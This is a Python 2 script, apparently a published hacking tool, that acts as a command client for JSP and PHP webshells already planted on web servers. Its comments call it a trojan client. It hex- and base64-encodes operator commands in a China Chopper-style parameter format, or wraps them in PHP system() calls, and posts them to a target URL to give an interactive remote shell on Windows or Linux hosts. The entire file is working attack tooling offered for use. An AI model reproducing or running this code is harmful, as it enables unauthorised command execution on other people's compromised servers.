# -*- coding:utf-8 -*-

'''
__date__:2016.9.18
__author__:nmask
__Blog__:http://thief.one
__Python_Version_:2.7.11
'''

import urllib
import urllib2
import binascii
import base64
import sys
import argparse


headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'}

RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
WHITE = '\033[1;37m'
BLUE='\033[1;34m'
END = '\033[0m'


class jsp:
	'''
	jsp木马客户端代码类
	'''
	def __init__(self,url,password):
		self.url=url
		self.password=password
		self.shell_decode="GB2312"   ##中文 编码问题
		self.run()

	def run(self):
		self.cmd()

	def chuli(self,s):
		s = s.replace("\n","").replace("\r","")
		s = binascii.a2b_hex(s)                           #16进制编码
		s = base64.b64decode(s).decode(self.shell_decode) #base64编码
		return s

	def cmd(self):
		try:
			shell_path=""
			shell_cmd = raw_input(GREEN+"JSP_Shell>"+END)
			while(cmp(shell_cmd,"q")):
				
				if shell_cmd!="":
					if shell_path == "":
						username=binascii.b2a_hex(base64.b64encode(self.password+"=A&z0="+self.shell_decode).encode(self.shell_decode))
						password=1
					else:
						if shell_path[0]!='/':#根据/判断是windows服务器还是Linux服务器
							username=binascii.b2a_hex(base64.b64encode(self.password+"=M&z0="+self.shell_decode+"&z1="+"/ccmd").encode(self.shell_decode))
							password=binascii.b2a_hex(base64.b64encode("cd /d \""+shell_path+"\"&"+shell_cmd+"&echo [S]&cd&echo [E]").encode(self.shell_decode))
						else:
							username=binascii.b2a_hex(base64.b64encode(self.password+"=M&z0="+self.shell_decode+"&z1="+"-c/bin/sh").encode(self.shell_decode))
							password=binascii.b2a_hex(base64.b64encode("cd "+shell_path+"/;"+shell_cmd+";echo [S];pwd;echo [E]").encode(self.shell_decode))
					

					postdata=urllib.urlencode({
						"username":username,                                    #构造post参数
						"password":password
						})

					req=urllib2.Request(
						url=self.url,            								#木马url地址
						data=postdata,
						headers=headers
						)

					response=urllib2.urlopen(req)
					
					if shell_path == "":
						s = self.chuli(response.read())	#处理密文
						s = s.split('\t')
						shell_path = s[0][3:]	#第一次获取服务器路径
						shell_cmd = shell_cmd
					else:
						s = self.chuli(response.read())	#处理密文
						s = s.split('[S]')
						shell_path = s[len(s)-1].split('[E]')[0].replace("\r","").replace("\n","") + "\\"#获取路径
						sys.stdout.write(s[0][3:]) 	#输出执行结果
						for i in range(1,len(s)-1):
							print s[i]	#输出执行结果
				shell_cmd = raw_input(GREEN+"JSP_Shell>"+END)
		except Exception, e:
			print e

class php:
	'''
	php木马客户端代码类
	'''
	def __init__(self,url,password):
		self.url=url
		self.password=password
		self.run()

	def run(self):
		self.cmd()

	def cmd(self):
		try:
			content=''
			cmd=raw_input(GREEN+'PHP_Shell>'+END)
			while(cmp(cmd,"q")):
				if cmd!="":
					content='system'+'('+'"'+cmd+'"'+');'
					content=binascii.b2a_hex(content)

					postdata=urllib.urlencode({
						self.password:content,                                    	#构造post参数
						})

					req=urllib2.Request(
						url=self.url,            								#木马url地址
						data=postdata,
						headers=headers
						)
					response=urllib2.urlopen(req).read()
					print response
					cmd=raw_input(GREEN+'PHP_Shell>'+END)
				else:
					cmd=raw_input(GREEN+'PHP_Shell>'+END)
		except Exception,e:
			print e


def proxy():
	'''
	代理函数
	'''
	proxy={'http':'127.0.0.1:8888'} #本地代理地址
	proxy_support=urllib2.ProxyHandler(proxy)
	opener=urllib2.build_opener(proxy_support)
	urllib2.install_opener(opener)


def main(url,password):   #判断是JSP木马还是PHP木马

	filename=url[-4:].lower()

	if "php" in filename:
		php(url,password)
	elif "jsp" in filename:
		jsp(url,password)
	else:
		print "[* HELP] python PyCmd.py --help"
		print "[* HELP] python PyCmd.py -u http://www.xx.com/1.jsp -p 123 [--proxy]"
		


if __name__=="__main__":

	parser=argparse.ArgumentParser()
	parser.add_argument("-u","--url",help="target_url",default="")
	parser.add_argument("-p","--pwd",help="shell_password",default="")
	parser.add_argument("--proxy",help="local_proxy",action='store_true')
	args=parser.parse_args()

	url=args.url
	password=args.pwd

	if args.proxy:
		proxy()               #开启抓包，方便调试

	main(url,password)

